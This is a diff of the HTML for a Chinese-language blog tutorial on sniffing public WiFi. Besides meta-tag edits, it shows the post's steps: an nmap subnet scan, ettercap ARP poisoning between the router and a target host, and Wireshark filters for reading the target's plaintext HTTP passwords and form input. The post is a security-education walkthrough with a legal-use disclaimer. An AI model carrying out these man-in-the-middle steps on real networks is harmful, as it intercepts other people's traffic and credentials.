@@ -7,7 +7,7 @@
     <title>公共WIFI網路嗅探 | 無面者小站</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1">
     <meta name="description" content="作者 阿維 同意條款 閱讀本篇文章等同承諾: 不將相關知識用在任何非法用途 不窺探他人隱私 保持誠實與友善 所有安全測試知識只用於維護安全的目的 測試用的器">
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.68.3" />
     
     
       
@@ -36,14 +36,17 @@
     <meta property="og:title" content="公共WIFI網路嗅探" />
 <meta property="og:description" content="作者 阿維 同意條款 閱讀本篇文章等同承諾: 不將相關知識用在任何非法用途 不窺探他人隱私 保持誠實與友善 所有安全測試知識只用於維護安全的目的 測試用的器" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://alextrinityblock.github.io/blog/public/post/secure/%E5%85%AC%E5%85%B1wifi%E7%B6%B2%E8%B7%AF%E5%97%85%E6%8E%A2/" /><meta property="article:section" content="post" />
+<meta property="og:url" content="https://alextrinityblock.github.io/blog/public/post/secure/%E5%85%AC%E5%85%B1wifi%E7%B6%B2%E8%B7%AF%E5%97%85%E6%8E%A2/" />
 <meta property="article:published_time" content="2021-07-08T16:00:49+08:00" />
 <meta property="article:modified_time" content="2021-07-08T16:00:49+08:00" />
-
 <meta itemprop="name" content="公共WIFI網路嗅探">
-<meta itemprop="description" content="作者 阿維 同意條款 閱讀本篇文章等同承諾: 不將相關知識用在任何非法用途 不窺探他人隱私 保持誠實與友善 所有安全測試知識只用於維護安全的目的 測試用的器"><meta itemprop="datePublished" content="2021-07-08T16:00:49+08:00" />
-<meta itemprop="dateModified" content="2021-07-08T16:00:49+08:00" />
+<meta itemprop="description" content="作者 阿維 同意條款 閱讀本篇文章等同承諾: 不將相關知識用在任何非法用途 不窺探他人隱私 保持誠實與友善 所有安全測試知識只用於維護安全的目的 測試用的器">
+<meta itemprop="datePublished" content="2021-07-08T16:00:49&#43;08:00" />
+<meta itemprop="dateModified" content="2021-07-08T16:00:49&#43;08:00" />
 <meta itemprop="wordCount" content="1042">
+
+
+
 <meta itemprop="keywords" content="secure,ettercap,資安,檢查,wifi,中間人攻擊," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="公共WIFI網路嗅探"/>
 <meta name="twitter:description" content="作者 阿維 同意條款 閱讀本篇文章等同承諾: 不將相關知識用在任何非法用途 不窺探他人隱私 保持誠實與友善 所有安全測試知識只用於維護安全的目的 測試用的器"/>
@@ -269,17 +272,17 @@
 <p>我們底下將直接展示透過不安全的WIFI來擷取網頁瀏覽資料的實做。</p>
 <h2 id="1了解自己的ip與wifi界面">1.了解自己的IP與WIFI界面</h2>
 <p>用以下指令了解自己在該網段的IP，假設自身的網段為192.168.43.0，我們的網路界面為wlp0s20f3</p>
-<pre tabindex="0"><code>ip address
+<pre><code>ip address
 </code></pre><p>如果在容器裡頭沒有該指令請另行下載</p>
-<pre tabindex="0"><code>apt install -y iproute2
+<pre><code>apt install -y iproute2
 </code></pre><h2 id="2發覺跟我們一起共用wifi的主機ip">2.發覺跟我們一起共用WIFI的主機IP</h2>
 <p>跟我們共用同樣的IP就可以被我們監聽</p>
 <p>安裝nmap</p>
-<pre tabindex="0"><code>apt install -y nmap
+<pre><code>apt install -y nmap
 </code></pre><p>掃描我們WIFI網段上的主機</p>
-<pre tabindex="0"><code>nmap  -sn  192.168.43.0/24 
+<pre><code>nmap  -sn  192.168.43.0/24 
 </code></pre><p>以下掃描結果:</p>
-<pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-09 10:51 CST
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-09 10:51 CST
 Nmap scan report for _gateway (192.168.43.1)
 Host is up (0.0028s latency).
 MAC Address: F6:F6:F5:32:57:DA (Unknown)
@@ -302,11 +305,11 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 2.24 seconds
 <p>用Ettercap插入WIFI分享器與監聽對象中間<br>
 這樣所以原本要通向WIFI分享器的封包都會路過我們的主機，被我們主機進行監測</p>
 <p>安裝ettercap命令行模式</p>
-<pre tabindex="0"><code>apt install -y ettercap-common
+<pre><code>apt install -y ettercap-common
 </code></pre><p>在軟體ettercap裡頭輸入wifi分享器與目標監聽主機的IP，記得順序要正確</p>
-<pre tabindex="0"><code>ettercap -T -S -i wlp0s20f3 -M arp:remote /192.168.43.1// /192.168.43.112//
+<pre><code>ettercap -T -S -i wlp0s20f3 -M arp:remote /192.168.43.1// /192.168.43.112//
 </code></pre><p>結果</p>
-<pre tabindex="0"><code>ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team
+<pre><code>ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team
 
 Listening on:
 wlp0s20f3 -&gt; 50:2F:9B:33:37:CC
@@ -337,7 +340,7 @@ ARP poisoning victims:
  GROUP 2 : 192.168.43.112 61:31:49:57:7E:C9
 
 </code></pre><p>我們可以看到裡頭有一段，這代表我們成功監聽了兩個主機之間的無線流量了</p>
-<pre tabindex="0"><code>ARP poisoning victims:
+<pre><code>ARP poisoning victims:
 
  GROUP 1 : 192.168.43.1 15:16:55:32:77:DA
 
@@ -345,11 +348,11 @@ ARP poisoning victims:
 
 </code></pre><h2 id="4wireshark擷取封包">4.Wireshark擷取封包</h2>
 <p>安裝wireshark</p>
-<pre tabindex="0"><code>apt install wireshark
+<pre><code>apt install wireshark
 </code></pre><p>打開wireshark</p>
-<pre tabindex="0"><code>sudo wireshark
+<pre><code>sudo wireshark
 </code></pre><p>打開wireshark在篩選器中輸入</p>
-<pre tabindex="0"><code>ip.src==192.168.43.112 &amp;&amp; http 
+<pre><code>ip.src==192.168.43.112 &amp;&amp; http 
 </code></pre><p>這樣就能指定擷取到對方HTTP的封包了。</p>
 <p>我們就可以看到目標監聽主機連上什麼網站了，而當沒有HTTPS的時候，目標主機的網站請求，密碼，表單輸入，通通都是明文呈現，可以被我們間聽到。</p>
 <p>但如果是HTTPS的話就算擷取了，也是加密訊息，看不懂的！<br>
